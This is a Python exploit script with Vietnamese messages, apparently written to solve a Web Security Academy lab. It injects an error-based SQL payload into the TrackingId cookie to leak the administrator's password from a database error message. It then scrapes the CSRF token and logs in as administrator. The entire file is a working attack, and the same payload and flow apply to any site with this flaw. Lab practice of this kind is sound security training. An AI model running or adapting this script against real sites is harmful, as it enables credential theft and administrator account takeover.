import requests
import re
from bs4 import BeautifulSoup

def extract_password(url, session_cookie):
    print("[*] Thực hiện SQLi để lấy mật khẩu administrator...")

    payload = "'AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    try:
        response = requests.get(url, cookies=cookies)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Lỗi khi gửi request đến URL: {e}")
        return None

    # Cho phép chuỗi có độ dài khác nhau, không chỉ đúng 20 ký tự
    match = re.search(r'integer: "(.+?)"', response.text)
    if match:
        password = match.group(1)
        print(f"[+] Mật khẩu tìm thấy: {password}")
        return password
    else:
        print("[-] Không tìm thấy chuỗi mật khẩu phù hợp.")
        return None

def login_admin(url, password):
    login_url = f"{url}/login"
    session = requests.Session()

    print("[*] Truy cập trang đăng nhập...")
    try:
        response = session.get(login_url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Lỗi khi truy cập {login_url}: {e}")
        return False

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})

    if not csrf_input or not csrf_input.get("value"):
        print("[-] Không tìm thấy CSRF token.")
        return False

    csrf_token = csrf_input["value"]
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": password
    }

    print("[*] Thử đăng nhập với tài khoản administrator...")
    try:
        response = session.post(login_url, data=data)
        if "Log out" in response.text or "Welcome" in response.text:
            print("[+] Đăng nhập thành công!")
            return True
        else:
            print("[-] Đăng nhập thất bại.")
            return False
    except requests.RequestException as e:
        print(f"[!] Lỗi khi gửi request đăng nhập: {e}")
        return False

if __name__ == "__main__":
    print("Nhập URL (ví dụ: https://xxxxx.web-security-academy.net/):")
    url = input(">> ").rstrip("/")

    session_cookie = input("Nhập session cookie: ").strip()

    password = extract_password(url, session_cookie)
    if password:
        login_admin(url, password)
